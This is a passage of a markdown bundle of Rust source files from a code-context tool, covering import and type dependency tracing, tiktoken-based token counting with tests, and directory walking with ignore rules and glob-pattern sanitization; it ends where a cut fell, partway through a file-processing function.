    fn new(files: &[FileInfo], _options: &SemanticOptions, cache: &'a FileCache) -> Result<Self> {
        let mut nodes = Vec::new();
        let mut path_to_index = HashMap::new();
        let mut index_to_path = HashMap::new();

        // Create nodes for all files
        for (index, file) in files.iter().enumerate() {
            path_to_index.insert(file.path.clone(), index);
            index_to_path.insert(index, file.path.clone());
            nodes.push(DependencyNode {
                file_index: index,
                depth: 0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            });
        }

        // Detect project root from first file
        let project_root = if let Some(first_file) = files.first() {
            Self::detect_project_root(&first_file.path)
        } else {
            // Fallback to current directory
            std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
        };

        Ok(Self {
            nodes,
            path_to_index,
            index_to_path,
            visited: HashSet::new(),
            cache,
            project_root,
        })
    }

    /// Detect the project root directory using git root or fallback methods
    fn detect_project_root(start_path: &Path) -> PathBuf {
        // Start from the directory containing the file
        let mut current = start_path.parent().unwrap_or(start_path);

        // First try to find git root
        loop {
            if current.join(".git").exists() {
                return current.to_path_buf();
            }
            if let Some(parent) = current.parent() {
                current = parent;
            } else {
                break;
            }
        }

        // If no .git found, output a warning message
        eprintln!("Warning: No .git directory found for file: {start_path:?}");
        eprintln!("Warning: --include-types functionality requires a git repository to properly detect project root.");
        eprintln!("Warning: Falling back to project marker detection...");

        // Fallback: Look for common project markers
        current = start_path.parent().unwrap_or(start_path);
        loop {
            // Check for Rust project markers
            if current.join("Cargo.toml").exists() {
                return current.to_path_buf();
            }
            // Check for Node.js project markers
            if current.join("package.json").exists() {
                return current.to_path_buf();
            }
            // Check for Python project markers
            if current.join("pyproject.toml").exists() || current.join("setup.py").exists() {
                return current.to_path_buf();
            }
            // Check for generic project markers
            if current.join("README.md").exists() || current.join("readme.md").exists() {
                return current.to_path_buf();
            }

            if let Some(parent) = current.parent() {
                current = parent;
            } else {
                break;
            }
        }

        // Final fallback: Look for common project structure indicators
        // Go up from the file directory and look for directories that indicate project root
        current = start_path.parent().unwrap_or(start_path);
        while let Some(parent) = current.parent() {
            // If we find a directory that contains both 'src' and other common directories,
            // it's likely the project root
            if parent.join("src").exists()
                && (parent.join("shared").exists()
                    || parent.join("lib").exists()
                    || parent.join("tests").exists())
            {
                return parent.to_path_buf();
            }
            current = parent;
        }

        // Ultimate fallback: use the directory containing the start path
        eprintln!(
            "Warning: Could not detect project root. Using directory containing file: {:?}",
            start_path.parent().unwrap_or(start_path)
        );
        start_path.parent().unwrap_or(start_path).to_path_buf()
    }

    /// Traverse dependencies using breadth-first search
    fn traverse_dependencies(&mut self, options: &SemanticOptions) -> Result<()> {
        let mut queue = VecDeque::new();

        // Start with all files at depth 0
        for i in 0..self.nodes.len() {
            queue.push_back((i, 0));
        }

        while let Some((file_idx, depth)) = queue.pop_front() {
            // Skip if we've already processed this file or exceeded max depth
            if self.visited.contains(&file_idx) || depth >= options.semantic_depth {
                continue;
            }

            self.visited.insert(file_idx);

            // Analyze this file
            if let Err(e) = self.analyze_file(file_idx, depth, options) {
                eprintln!("Warning: Failed to analyze file index {file_idx}: {e}");
                continue;
            }

            // Queue dependencies for next level
            let node = &self.nodes[file_idx];
            for import_path in &node.imports {
                if let Some(&dep_idx) = self.path_to_index.get(import_path) {
                    if !self.visited.contains(&dep_idx) && depth + 1 < options.semantic_depth {
                        queue.push_back((dep_idx, depth + 1));
                    }
                }
            }
        }

        Ok(())
    }

    /// Analyze a single file and extract semantic information
    fn analyze_file(
        &mut self,
        file_idx: usize,
        depth: usize,
        options: &SemanticOptions,
    ) -> Result<()> {
        // Get file info from the original files vector
        let _file_path = self.nodes[file_idx].file_index;

        // Skip if file type is not a programming language
        // This check would use the actual FileInfo from the files vector

        // Get the appropriate analyzer
        let analyzer =
            match crate::core::semantic::get_analyzer_for_file(self.get_file_path(file_idx))? {
                Some(analyzer) => analyzer,
                None => return Ok(()), // No analyzer for this file type
            };

        // Read file content
        let content = self.cache.get_or_load(self.get_file_path(file_idx))?;

        // Create context using project root instead of file's parent directory
        let context = SemanticContext::new(
            self.get_file_path(file_idx).to_path_buf(),
            self.project_root.clone(),
            options.semantic_depth,
        );

        // Perform analysis
        let analysis_result =
            analyzer.analyze_file(self.get_file_path(file_idx), &content, &context)?;

        // Process imports - we need import info for type expansion even if trace_imports is false
        // Store raw import module paths for file expansion
        let mut raw_imports = Vec::new();
        for import in &analysis_result.imports {
            // Convert module path to a simple PathBuf for now
            // This will be used by file_expander to find type definition files
            raw_imports.push(PathBuf::from(&import.module));
        }

        if options.trace_imports {
            let mut resolved_imports = Vec::new();

            if let Ok(Some(resolver)) =
                crate::core::semantic::get_resolver_for_file(self.get_file_path(file_idx))
            {
                for import in &analysis_result.imports {
                    match resolver.resolve_import(
                        &import.module,
                        self.get_file_path(file_idx),
                        &self.project_root,
                    ) {
                        Ok(resolved) => {
                            if !resolved.is_external
                                && self.path_to_index.contains_key(&resolved.path)
                            {
                                resolved_imports.push(resolved.path);
                            }
                        }
                        Err(_) => {
                            // Simple fallback resolution
                            if let Some(resolved) = self.simple_resolve(&import.module, file_idx) {
                                resolved_imports.push(resolved);
                            }
                        }
                    }
                }
            }

            // Use resolved imports if available, otherwise use raw imports
            self.nodes[file_idx].imports = if !resolved_imports.is_empty() {
                resolved_imports
            } else {
                raw_imports
            };
        } else {
            // Even if trace_imports is false, we need import info for type expansion
            self.nodes[file_idx].imports = raw_imports;
        }

        // Store function calls and type references
        if options.include_callers {
            self.nodes[file_idx].function_calls = analysis_result.function_calls;
        }

        if options.include_types {
            self.nodes[file_idx].type_references = analysis_result.type_references;
        }

        self.nodes[file_idx].depth = depth;

        Ok(())
    }

    /// Get file path for a given index
    fn get_file_path(&self, file_idx: usize) -> &Path {
        self.index_to_path
            .get(&file_idx)
            .map(|p| p.as_path())
            .unwrap_or(Path::new(""))
    }

    /// Simple import resolution fallback
    fn simple_resolve(&self, module: &str, from_idx: usize) -> Option<PathBuf> {
        let from_path = self.get_file_path(from_idx);
        let parent = from_path.parent()?;

        // Try common patterns
        for ext in &["rs", "py", "js", "ts"] {
            let candidate = parent.join(format!("{module}.{ext}"));
            if self.path_to_index.contains_key(&candidate) {
                return Some(candidate);
            }
        }

        None
    }

    /// Apply the discovered dependencies back to the files
    fn apply_to_files(&self, files: &mut [FileInfo]) {
        // Update imports and reverse dependencies
        for node in &self.nodes {
            let file = &mut files[node.file_index];

            // Update imports
            for import_path in &node.imports {
                if !file.imports.contains(import_path) {
                    file.imports.push(import_path.clone());
                }
            }

            // Update function calls
            file.function_calls = node.function_calls.clone();

            // Update type references
            file.type_references = node.type_references.clone();
        }

        // Build reverse dependencies - collect first, then update
        let mut reverse_deps: Vec<(usize, PathBuf)> = Vec::new();
        for file in files.iter() {
            for import in &file.imports {
                if let Some(&imported_idx) = self.path_to_index.get(import) {
                    let importing_path = file.path.clone();
                    reverse_deps.push((imported_idx, importing_path));
                }
            }
        }

        // Apply reverse dependencies
        for (imported_idx, importing_path) in reverse_deps {
            if !files[imported_idx].imported_by.contains(&importing_path) {
                files[imported_idx].imported_by.push(importing_path);
            }
        }

        // Process function calls to build caller relationships
        if !files.is_empty() {
            self.process_function_calls(files);
        }

        // Process type references to build type relationships
        if !files.is_empty() {
            self.process_type_references(files);
        }
    }

    /// Process function calls to determine caller relationships
    fn process_function_calls(&self, files: &mut [FileInfo]) {
        // Build module name to file index mapping
        let mut module_to_files: HashMap<String, Vec<usize>> = HashMap::new();

        for (idx, file) in files.iter().enumerate() {
            if let Some(stem) = file.path.file_stem() {
                let module_name = stem.to_string_lossy().to_string();
                module_to_files
                    .entry(module_name.clone())
                    .or_default()
                    .push(idx);

                // Handle index files
                if stem == "mod" || stem == "index" || stem == "__init__" {
                    if let Some(parent) = file.path.parent() {
                        if let Some(parent_name) = parent.file_name() {
                            let parent_module = parent_name.to_string_lossy().to_string();
                            module_to_files.entry(parent_module).or_default().push(idx);
                        }
                    }
                }
            }
        }

        // Find caller relationships - collect first, then update
        let mut relationships: Vec<(usize, usize)> = Vec::new();

        for (caller_idx, file) in files.iter().enumerate() {
            for func_call in &file.function_calls {
                if let Some(module) = &func_call.module {
                    if let Some(file_indices) = module_to_files.get(module) {
                        for &called_idx in file_indices {
                            if called_idx != caller_idx {
                                relationships.push((caller_idx, called_idx));
                            }
                        }
                    }
                }
            }
        }

        // Apply relationships
        for (caller_idx, called_idx) in relationships {
            let called_path = files[called_idx].path.clone();
            if !files[caller_idx].imports.contains(&called_path) {
                files[caller_idx].imports.push(called_path.clone());
            }

            let caller_path = files[caller_idx].path.clone();
            if !files[called_idx].imported_by.contains(&caller_path) {
                files[called_idx].imported_by.push(caller_path);
            }
        }
    }

    /// Process type references to determine type relationships
    fn process_type_references(&self, files: &mut [FileInfo]) {
        // Build type name to file index mapping
        let mut type_to_files: HashMap<String, Vec<(usize, PathBuf)>> = HashMap::new();

        for (idx, file) in files.iter().enumerate() {
            if let Some(stem) = file.path.file_stem() {
                let type_name = stem.to_string_lossy().to_string();

                // Add capitalized version
                let capitalized = capitalize_first(&type_name);
                type_to_files
                    .entry(capitalized)
                    .or_default()
                    .push((idx, file.path.clone()));

                // Add original name
                type_to_files
                    .entry(type_name)
                    .or_default()
                    .push((idx, file.path.clone()));
            }
        }

        // Update type references with definition paths
        for file in files.iter_mut() {
            for type_ref in &mut file.type_references {
                // Skip if already has definition path or is external
                if type_ref.definition_path.is_some() || type_ref.is_external {
                    continue;
                }

                // Try to find the definition file
                if let Some(file_info) = type_to_files.get(&type_ref.name) {
                    // Use the first match that's not the current file
                    for (_def_idx, def_path) in file_info {
                        if &file.path != def_path {
                            type_ref.definition_path = Some(def_path.clone());
                            break;
                        }
                    }
                }
            }
        }

        // Find type usage relationships - collect first, then update
        let mut relationships: Vec<(usize, usize)> = Vec::new();

        for (user_idx, file) in files.iter().enumerate() {
            for type_ref in &file.type_references {
                if let Some(file_info) = type_to_files.get(&type_ref.name) {
                    for &(def_idx, _) in file_info {
                        if def_idx != user_idx {
                            relationships.push((user_idx, def_idx));
                        }
                    }
                }
            }
        }

        // Apply relationships
        for (user_idx, def_idx) in relationships {
            let def_path = files[def_idx].path.clone();
            if !files[user_idx].imports.contains(&def_path) {
                files[user_idx].imports.push(def_path.clone());
            }

            let user_path = files[user_idx].path.clone();
            if !files[def_idx].imported_by.contains(&user_path) {
                files[def_idx].imported_by.push(user_path);
            }
        }
    }
}

/// Capitalize the first letter of a string
fn capitalize_first(s: &str) -> String {
    let mut chars = s.chars();
    match chars.next() {
        None => String::new(),
        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
    }
}
```

## src/core/token.rs

Imports: anyhow::Result, rayon::prelude::*, std::collections::HashMap, std, tiktoken_rs, std::collections::hash_map::DefaultHasher, tests, super::*

Type references: TokenCounter, tiktoken_rs.CoreBPE, std.Mutex, std.Mutex, TokenCounter, Self, TokenCounter, FileTokenCount, FileTokenCount, TotalTokenEstimate, TotalTokenEstimate, Default, TokenCounter, Self, Self, FileTokenCount, TotalTokenEstimate, FileTokenCount, std::collections::hash_map::DefaultHasher.DefaultHasher

```rust
//! Token counting functionality using tiktoken-rs

use anyhow::Result;
use rayon::prelude::*;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tiktoken_rs::{cl100k_base, CoreBPE};

/// Token counter with caching support
pub struct TokenCounter {
    /// The tiktoken encoder
    encoder: Arc<CoreBPE>,
    /// Cache of token counts for content hashes
    cache: Arc<Mutex<HashMap<u64, usize>>>,
}

impl TokenCounter {
    /// Create a new token counter with cl100k_base encoding (GPT-4)
    pub fn new() -> Result<Self> {
        let encoder = cl100k_base()?;
        Ok(TokenCounter {
            encoder: Arc::new(encoder),
            cache: Arc::new(Mutex::new(HashMap::new())),
        })
    }

    /// Count tokens in a single text
    pub fn count_tokens(&self, text: &str) -> Result<usize> {
        // Calculate hash for caching
        let hash = calculate_hash(text);

        // Check cache first
        if let Ok(cache) = self.cache.lock() {
            if let Some(&count) = cache.get(&hash) {
                return Ok(count);
            }
        }

        // Count tokens
        let tokens = self.encoder.encode_with_special_tokens(text);
        let count = tokens.len();

        // Store in cache
        if let Ok(mut cache) = self.cache.lock() {
            cache.insert(hash, count);
        }

        Ok(count)
    }

    /// Count tokens in multiple texts in parallel
    pub fn count_tokens_parallel(&self, texts: &[String]) -> Result<Vec<usize>> {
        texts
            .par_iter()
            .map(|text| self.count_tokens(text))
            .collect()
    }

    /// Count tokens for a file's content with metadata
    pub fn count_file_tokens(&self, content: &str, path: &str) -> Result<FileTokenCount> {
        let content_tokens = self.count_tokens(content)?;

        // Count tokens in the file path/header that will be included in markdown
        let header = format!("## {path}\n\n```\n");
        let footer = "\n```\n\n";
        let header_tokens = self.count_tokens(&header)?;
        let footer_tokens = self.count_tokens(footer)?;

        Ok(FileTokenCount {
            content_tokens,
            overhead_tokens: header_tokens + footer_tokens,
            total_tokens: content_tokens + header_tokens + footer_tokens,
        })
    }

    /// Estimate tokens for multiple files
    pub fn estimate_total_tokens(&self, files: &[(String, String)]) -> Result<TotalTokenEstimate> {
        let mut total_content = 0;
        let mut total_overhead = 0;
        let mut file_counts = Vec::new();

        for (path, content) in files {
            let count = self.count_file_tokens(content, path)?;
            total_content += count.content_tokens;
            total_overhead += count.overhead_tokens;
            file_counts.push((path.clone(), count));
        }

        Ok(TotalTokenEstimate {
            total_tokens: total_content + total_overhead,
            content_tokens: total_content,
            overhead_tokens: total_overhead,
            file_counts,
        })
    }
}

impl Default for TokenCounter {
    fn default() -> Self {
        Self::new().expect("Failed to create token counter")
    }
}

/// Token count for a single file
#[derive(Debug, Clone)]
pub struct FileTokenCount {
    /// Tokens in the file content
    pub content_tokens: usize,
    /// Tokens in markdown formatting overhead
    pub overhead_tokens: usize,
    /// Total tokens (content + overhead)
    pub total_tokens: usize,
}

/// Total token estimate for multiple files
#[derive(Debug)]
pub struct TotalTokenEstimate {
    /// Total tokens across all files
    pub total_tokens: usize,
    /// Total content tokens
    pub content_tokens: usize,
    /// Total overhead tokens
    pub overhead_tokens: usize,
    /// Individual file counts
    pub file_counts: Vec<(String, FileTokenCount)>,
}

/// Calculate a hash for content caching
fn calculate_hash(text: &str) -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let mut hasher = DefaultHasher::new();
    text.hash(&mut hasher);
    hasher.finish()
}

/// Check if adding a file would exceed token limit
pub fn would_exceed_limit(current_tokens: usize, file_tokens: usize, max_tokens: usize) -> bool {
    current_tokens + file_tokens > max_tokens
}

/// Calculate remaining token budget
pub fn remaining_tokens(current_tokens: usize, max_tokens: usize) -> usize {
    max_tokens.saturating_sub(current_tokens)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_token_counting() {
        let counter = TokenCounter::new().unwrap();

        // Test simple text
        let count = counter.count_tokens("Hello, world!").unwrap();
        assert!(count > 0);

        // Test empty text
        let count = counter.count_tokens("").unwrap();
        assert_eq!(count, 0);

        // Test caching
        let text = "This is a test text for caching";
        let count1 = counter.count_tokens(text).unwrap();
        let count2 = counter.count_tokens(text).unwrap();
        assert_eq!(count1, count2);
    }

    #[test]
    fn test_file_token_counting() {
        let counter = TokenCounter::new().unwrap();

        let content = "fn main() {\n    println!(\"Hello, world!\");\n}";
        let path = "src/main.rs";

        let count = counter.count_file_tokens(content, path).unwrap();
        assert!(count.content_tokens > 0);
        assert!(count.overhead_tokens > 0);
        assert_eq!(
            count.total_tokens,
            count.content_tokens + count.overhead_tokens
        );
    }

    #[test]
    fn test_parallel_counting() {
        let counter = TokenCounter::new().unwrap();

        let texts = vec![
            "First text".to_string(),
            "Second text".to_string(),
            "Third text".to_string(),
        ];

        let counts = counter.count_tokens_parallel(&texts).unwrap();
        assert_eq!(counts.len(), 3);
        assert!(counts.iter().all(|&c| c > 0));
    }

    #[test]
    fn test_token_limit_checks() {
        assert!(would_exceed_limit(900, 200, 1000));
        assert!(!would_exceed_limit(800, 200, 1000));

        assert_eq!(remaining_tokens(300, 1000), 700);
        assert_eq!(remaining_tokens(1100, 1000), 0);
    }

    #[test]
    fn test_total_estimation() {
        let counter = TokenCounter::new().unwrap();

        let files = vec![
            ("file1.rs".to_string(), "content1".to_string()),
            ("file2.rs".to_string(), "content2".to_string()),
        ];

        let estimate = counter.estimate_total_tokens(&files).unwrap();
        assert!(estimate.total_tokens > 0);
        assert_eq!(estimate.file_counts.len(), 2);
    }
}
```

## src/core/walker.rs

Imports: crate::utils::error::ContextCreatorError, crate::utils::file_ext::FileType, anyhow::Result, glob::Pattern, ignore, rayon::prelude::*, std, std::sync::Arc, itertools::Itertools, tests, super::*, tempfile::TempDir, crate::cli::Config, crate, crate::config::ConfigFile, config

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, crate::utils::file_ext::FileType.FileType, glob::Pattern.Pattern, CompiledPriority, glob::Pattern.Pattern, glob::Pattern.Pattern, CompiledPriority, Self, glob.PatternError, PatternError, Self, crate.Priority, Self, glob.PatternError, PatternError, WalkOptions, CompiledPriority, WalkOptions, crate::cli::Config.Config, Self, WalkOptions, Default, WalkOptions, Self, Self, WalkOptions, FileInfo, std.PathBuf, std.PathBuf, std.PathBuf, std.PathBuf, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, std.PathBuf, std.PathBuf, FunctionCall, TypeReference, FileInfo, crate::utils::file_ext::FileType.FileType, std.Path, std.Path, WalkOptions, WalkOptions, FileInfo, std.Path, std.Path, WalkOptions, WalkOptions, ignore.Walk, ignore.Walk, ignore.Walk, std.Path, std.Path, WalkOptions, WalkOptions, FileInfo, ignore.Walk, ignore.Walk, std.Path, std.Path, WalkOptions, WalkOptions, FileInfo, itertools::Itertools.Itertools, _, FileInfo, crate::utils::error::ContextCreatorError.ContextCreatorError, ContextCreatorError.FileProcessingError, FileProcessingError, _, _, _, FileInfo, std.Path, std.Path, std.Path, std.Path, WalkOptions, WalkOptions, FileInfo, FileInfo, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, std.Path, std.Path, CompiledPriority, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, std.Path, std.Path, FileInfo, crate::cli::Config.Config, FileCache, tempfile::TempDir.TempDir, WalkOptions, crate::cli::Config.Config, tempfile::TempDir.TempDir, crate::cli::Config.Config, WalkOptions, WalkOptions, CompiledPriority, tempfile::TempDir.TempDir, crate.ConfigFile, crate::cli::Config.Config, tempfile::TempDir.TempDir, crate.ConfigFile, crate::cli::Config.Config, crate.ConfigFile, tempfile::TempDir.TempDir, crate.ConfigFile, crate::cli::Config.Config, tempfile::TempDir.TempDir, crate.ConfigFile, crate::cli::Config.Config, tempfile::TempDir.TempDir, crate.ConfigFile, crate::cli::Config.Config, FileInfo, FileInfo, crate::cli::Config.Config, crate::cli::Config.Config, crate::cli::Config.Config, crate::utils::error::ContextCreatorError.ContextCreatorError, ContextCreatorError.FileProcessingError, FileProcessingError, tempfile::TempDir.TempDir, WalkOptions, crate::cli::Config.Config, crate::cli::Config.Config, crate::cli::Config.Config, crate::cli::Config.Config

```rust
//! Directory walking functionality with .gitignore and .context-creator-ignore support

use crate::utils::error::ContextCreatorError;
use crate::utils::file_ext::FileType;
use anyhow::Result;
use glob::Pattern;
use ignore::{Walk, WalkBuilder};
use rayon::prelude::*;
use std::path::{Path, PathBuf};
use std::sync::Arc;

/// Compiled priority rule for efficient pattern matching
///
/// This struct represents a custom priority rule that has been compiled from
/// the configuration file. The glob pattern is pre-compiled for performance,
/// and the weight is applied additively to the base file type priority.
///
/// # Priority Calculation
/// Final priority = base_priority + weight (if pattern matches)
///
/// # Pattern Matching
/// Uses first-match-wins semantics - the first pattern that matches a file
/// will determine the priority adjustment. Subsequent patterns are not evaluated.
#[derive(Debug, Clone)]
pub struct CompiledPriority {
    /// Pre-compiled glob pattern for efficient matching
    pub matcher: Pattern,
    /// Priority weight to add to base priority (can be negative)
    pub weight: f32,
    /// Original pattern string for debugging and error reporting
    pub original_pattern: String,
}

impl CompiledPriority {
    /// Create a CompiledPriority from a pattern string
    pub fn new(pattern: &str, weight: f32) -> Result<Self, glob::PatternError> {
        let matcher = Pattern::new(pattern)?;
        Ok(Self {
            matcher,
            weight,
            original_pattern: pattern.to_string(),
        })
    }

    /// Convert from config::Priority to CompiledPriority with error handling
    pub fn try_from_config_priority(
        priority: &crate::config::Priority,
    ) -> Result<Self, glob::PatternError> {
        Self::new(&priority.pattern, priority.weight)
    }
}

/// Options for walking directories
#[derive(Debug, Clone)]
pub struct WalkOptions {
    /// Maximum file size in bytes
    pub max_file_size: Option<usize>,
    /// Follow symbolic links
    pub follow_links: bool,
    /// Include hidden files
    pub include_hidden: bool,
    /// Use parallel processing
    pub parallel: bool,
    /// Custom ignore file name (default: .context-creator-ignore)
    pub ignore_file: String,
    /// Additional glob patterns to ignore
    pub ignore_patterns: Vec<String>,
    /// Only include files matching these patterns
    pub include_patterns: Vec<String>,
    /// Custom priority rules for file prioritization
    pub custom_priorities: Vec<CompiledPriority>,
    /// Filter out binary files by extension
    pub filter_binary_files: bool,
}

impl WalkOptions {
    /// Create WalkOptions from CLI config
    pub fn from_config(config: &crate::cli::Config) -> Result<Self> {
        // Convert config priorities to CompiledPriority with error handling
        let mut custom_priorities = Vec::new();
        for priority in &config.custom_priorities {
            match CompiledPriority::try_from_config_priority(priority) {
                Ok(compiled) => custom_priorities.push(compiled),
                Err(e) => {
                    return Err(ContextCreatorError::ConfigError(format!(
                        "Invalid glob pattern '{}' in custom priorities: {e}",
                        priority.pattern
                    ))
                    .into());
                }
            }
        }

        // Get include patterns from CLI config and filter out empty/whitespace patterns
        let include_patterns = config
            .get_include_patterns()
            .into_iter()
            .filter(|pattern| !pattern.trim().is_empty())
            .collect();

        // Get ignore patterns from CLI config and filter out empty/whitespace patterns
        let ignore_patterns = config
            .get_ignore_patterns()
            .into_iter()
            .filter(|pattern| !pattern.trim().is_empty())
            .collect();

        Ok(WalkOptions {
            max_file_size: Some(10 * 1024 * 1024), // 10MB default
            follow_links: false,
            include_hidden: false,
            parallel: true,
            ignore_file: ".context-creator-ignore".to_string(),
            ignore_patterns,
            include_patterns,
            custom_priorities,
            filter_binary_files: config.get_prompt().is_some(),
        })
    }
}

impl Default for WalkOptions {
    fn default() -> Self {
        WalkOptions {
            max_file_size: Some(10 * 1024 * 1024), // 10MB
            follow_links: false,
            include_hidden: false,
            parallel: true,
            ignore_file: ".context-creator-ignore".to_string(),
            ignore_patterns: vec![],
            include_patterns: vec![],
            custom_priorities: vec![],
            filter_binary_files: false,
        }
    }
}

/// Information about a file found during walking
#[derive(Debug, Clone)]
pub struct FileInfo {
    /// Absolute path to the file
    pub path: PathBuf,
    /// Relative path from the root directory
    pub relative_path: PathBuf,
    /// File size in bytes
    pub size: u64,
    /// File type based on extension
    pub file_type: FileType,
    /// Priority score (higher is more important)
    pub priority: f32,
    /// Files that this file imports/depends on (for semantic analysis)
    pub imports: Vec<PathBuf>,
    /// Files that import this file (reverse dependencies)
    pub imported_by: Vec<PathBuf>,
    /// Function calls made by this file (for --include-callers analysis)
    pub function_calls: Vec<crate::core::semantic::analyzer::FunctionCall>,
    /// Type references used by this file (for --include-types analysis)
    pub type_references: Vec<crate::core::semantic::analyzer::TypeReference>,
}

impl FileInfo {
    /// Get a display string for the file type
    pub fn file_type_display(&self) -> &'static str {
        use crate::utils::file_ext::FileType;
        match self.file_type {
            FileType::Rust => "Rust",
            FileType::Python => "Python",
            FileType::JavaScript => "JavaScript",
            FileType::TypeScript => "TypeScript",
            FileType::Go => "Go",
            FileType::Java => "Java",
            FileType::Cpp => "C++",
            FileType::C => "C",
            FileType::CSharp => "C#",
            FileType::Ruby => "Ruby",
            FileType::Php => "PHP",
            FileType::Swift => "Swift",
            FileType::Kotlin => "Kotlin",
            FileType::Scala => "Scala",
            FileType::Haskell => "Haskell",
            FileType::Dart => "Dart",
            FileType::Lua => "Lua",
            FileType::R => "R",
            FileType::Julia => "Julia",
            FileType::Elixir => "Elixir",
            FileType::Elm => "Elm",
            FileType::Markdown => "Markdown",
            FileType::Json => "JSON",
            FileType::Yaml => "YAML",
            FileType::Toml => "TOML",
            FileType::Xml => "XML",
            FileType::Html => "HTML",
            FileType::Css => "CSS",
            FileType::Text => "Text",
            FileType::Other => "Other",
        }
    }
}

/// Walk a directory and collect file information
pub fn walk_directory(root: &Path, options: WalkOptions) -> Result<Vec<FileInfo>> {
    if !root.exists() {
        return Err(ContextCreatorError::InvalidPath(format!(
            "Directory does not exist: {}",
            root.display()
        ))
        .into());
    }

    if !root.is_dir() {
        return Err(ContextCreatorError::InvalidPath(format!(
            "Path is not a directory: {}",
            root.display()
        ))
        .into());
    }

    let root = root.canonicalize()?;
    let walker = build_walker(&root, &options)?;

    if options.parallel {
        walk_parallel(walker, &root, &options)
    } else {
        walk_sequential(walker, &root, &options)
    }
}

/// Sanitize include patterns to prevent security issues
pub fn sanitize_pattern(pattern: &str) -> Result<String> {
    // Length limit to prevent resource exhaustion
    if pattern.len() > 1000 {
        return Err(ContextCreatorError::InvalidConfiguration(
            "Pattern too long (max 1000 characters)".to_string(),
        )
        .into());
    }

    // No null bytes, control characters, or dangerous Unicode characters
    if pattern.contains('\0')
        || pattern.chars().any(|c| {
            c.is_control() ||
            c == '\u{2028}' ||  // Line separator
            c == '\u{2029}' ||  // Paragraph separator
            c == '\u{FEFF}' // Byte order mark
        })
    {
        return Err(ContextCreatorError::InvalidConfiguration(
            "Pattern contains invalid characters (null bytes or control characters)".to_string(),
        )
        .into());
    }

    // No absolute paths to prevent directory traversal
    if pattern.starts_with('/') || pattern.starts_with('\\') {
        return Err(ContextCreatorError::InvalidConfiguration(
            "Absolute paths not allowed in patterns".to_string(),
        )
        .into());
    }

    // Prevent directory traversal
    if pattern.contains("..") {
        return Err(ContextCreatorError::InvalidConfiguration(
            "Directory traversal (..) not allowed in patterns".to_string(),
        )
        .into());
    }

    Ok(pattern.to_string())
}

/// Build the ignore walker with configured options
fn build_walker(root: &Path, options: &WalkOptions) -> Result<Walk> {
    let mut builder = WalkBuilder::new(root);

    // Configure the walker
    builder
        .follow_links(options.follow_links)
        .hidden(!options.include_hidden)
        .git_ignore(true)
        .git_global(true)
        .git_exclude(true)
        .ignore(true)
        .parents(true)
        .add_custom_ignore_filename(&options.ignore_file);

    // Add custom ignore patterns (with sanitization for security)
    for pattern in &options.ignore_patterns {
        if !pattern.trim().is_empty() {
            // Sanitize pattern for security
            let sanitized_pattern = sanitize_pattern(pattern)?;

            // Add the sanitized pattern to the walker
            if builder.add_ignore(&sanitized_pattern).is_none() {
                return Err(ContextCreatorError::InvalidConfiguration(format!(
                    "Invalid ignore pattern '{pattern}': pattern could not be added"
                ))
                .into());
            }
        }
    }

    // Handle include patterns using OverrideBuilder for proper filtering
    if !options.include_patterns.is_empty() {
        let mut override_builder = ignore::overrides::OverrideBuilder::new(root);

        for pattern in &options.include_patterns {
            if !pattern.trim().is_empty() {
                // Sanitize pattern for security
                let sanitized_pattern = sanitize_pattern(pattern)?;

                // Include patterns are added directly (not as negations)
                override_builder.add(&sanitized_pattern).map_err(|e| {
                    ContextCreatorError::InvalidConfiguration(format!(
                        "Invalid include pattern '{pattern}': {e}"
                    ))
                })?;
            }
        }

        let overrides = override_builder.build().map_err(|e| {
            ContextCreatorError::InvalidConfiguration(format!(
                "Failed to build include pattern overrides: {e}"
            ))
        })?;

        builder.overrides(overrides);
    }

    Ok(builder.build())
}

/// Walk directory sequentially
fn walk_sequential(walker: Walk, root: &Path, options: &WalkOptions) -> Result<Vec<FileInfo>> {
    let mut files = Vec::new();

    for entry in walker {
        let entry = entry?;
        let path = entry.path();

        // Skip directories
        if path.is_dir() {
            continue;
        }

        // Process file
        if let Some(file_info) = process_file(path, root, options)? {
            files.push(file_info);
        }
    }

    Ok(files)
}

/// Walk directory in parallel
fn walk_parallel(walker: Walk, root: &Path, options: &WalkOptions) -> Result<Vec<FileInfo>> {
    use itertools::Itertools;

    let root = Arc::new(root.to_path_buf());
    let options = Arc::new(options.clone());

    // Collect entries first
    let entries: Vec<_> = walker
        .filter_map(|e| e.ok())
        .filter(|e| !e.path().is_dir())
        .collect();

    // Process in parallel with proper error collection
    let results: Vec<Result<Option<FileInfo>, ContextCreatorError>> = entries
        .into_par_iter()
        .map(|entry| {
            let path = entry.path();
            match process_file(path, &root, &options) {
                Ok(file_info) => Ok(file_info),
                Err(e) => Err(ContextCreatorError::FileProcessingError {
                    path: path.display().to_string(),
                    error: e.to_string(),
                }),
            }
        })
        .collect();

    // Use partition_result to separate successes from errors
    let (successes, errors): (Vec<_>, Vec<_>) = results.into_iter().partition_result();

    // Handle errors based on severity
    if !errors.is_empty() {
        let critical_errors: Vec<_> = errors
            .iter()
            .filter(|e| {
                e.to_string().contains("Permission denied") || e.to_string().contains("Invalid")
            })
            .collect();

        if !critical_errors.is_empty() {
            // Critical errors should fail the operation
            let error_summary: Vec<String> =
                critical_errors.iter().map(|e| e.to_string()).collect();
            return Err(anyhow::anyhow!(
                "Critical file processing errors encountered: {}",
                error_summary.join(", ")
            ));
        }

        // Non-critical errors are logged as warnings
        eprintln!("Warning: {} files could not be processed:", errors.len());
        for error in &errors {
            eprintln!("  {error}");
        }
    }

    // Filter out None values and return successful file infos
    let files: Vec<FileInfo> = successes.into_iter().flatten().collect();
    Ok(files)
}

/// Process a single file
fn process_file(path: &Path, root: &Path, options: &WalkOptions) -> Result<Option<FileInfo>> {
    // Get file metadata
    let metadata = match std::fs::metadata(path) {
        Ok(meta) => meta,
        Err(_) => return Ok(None), // Skip files we can't read
    };

    let size = metadata.len();

    // Check file size limit
    if let Some(max_size) = options.max_file_size {
